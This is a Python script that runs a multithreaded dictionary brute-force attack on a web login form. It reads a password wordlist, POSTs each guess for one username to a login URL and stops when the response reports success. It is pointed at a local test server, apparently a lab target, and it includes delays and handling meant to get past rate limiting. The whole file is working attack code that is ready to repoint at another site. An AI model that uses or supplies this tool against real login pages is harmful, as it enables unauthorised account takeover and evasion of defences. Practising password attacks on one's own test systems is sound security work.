import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# --- Configuration ---
TARGET_URL = 'http://127.0.0.1:5000/login'
WORDLIST_PATH = 'wordlist.txt'
USERNAME = 'testuser'
MAX_THREADS = 5

# --- Setup Logging ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler('log.txt'),
        logging.StreamHandler() # Also print to console
    ]
)

# A global flag to signal all threads to stop once the password is found
password_found = False

def attempt_login(password):
    """
    Attempts to log in with a single password.
    Returns the password if successful, otherwise returns None.
    """
    global password_found
    if password_found:
        return None # Stop if another thread already found the password

    # Add a delay to avoid rate limiting
    time.sleep(0.5)

    try:
        # The data payload to send with the POST request
        payload = {'username': USERNAME, 'password': password}
        
        # Send the request
        response = requests.post(TARGET_URL, data=payload, timeout=5)
        
        logging.info(f"Trying password: '{password}' -> Status: {response.status_code}, Response: {response.text.strip()}")
        
        # Check if the login was successful
        if "successful" in response.text:
            password_found = True
            return password
        elif "Too many" in response.text:
            # Handle rate limiting
            logging.warning("Rate limit hit. Pausing for a moment.")
            # We don't need to sleep here as other attempts will also hit this,
            # but in a real-world scenario, you might add a delay.
            pass
            
    except requests.exceptions.RequestException as e:
        logging.error(f"An error occurred with password '{password}': {e}")
        
    return None

def main():
    """
    Main function to run the brute-force attack.
    """
    logging.info(f"Starting brute-force attack on {TARGET_URL} for user '{USERNAME}'.")
    
    try:
        with open(WORDLIST_PATH, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
        logging.info(f"Loaded {len(passwords)} passwords from wordlist.")
    except FileNotFoundError:
        logging.error(f"Wordlist not found at '{WORDLIST_PATH}'. Exiting.")
        return

    start_time = time.time()
    
    # Using ThreadPoolExecutor to run attempts in parallel
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Create a future for each password attempt
        future_to_password = {executor.submit(attempt_login, p): p for p in passwords}
        
        for future in as_completed(future_to_password):
            result = future.result()
            if result:
                logging.info("=" * 40)
                logging.info(f"SUCCESS! Password found: {result}")
                logging.info("=" * 40)
                
                # Signal other threads to stop and shut down the executor
                executor.shutdown(wait=False, cancel_futures=True)
                break
    
    if not password_found:
        logging.info("Attack finished. Password not found in the wordlist.")

    end_time = time.time()
    logging.info(f"Total execution time: {end_time - start_time:.2f} seconds.")


if __name__ == '__main__':
    main()
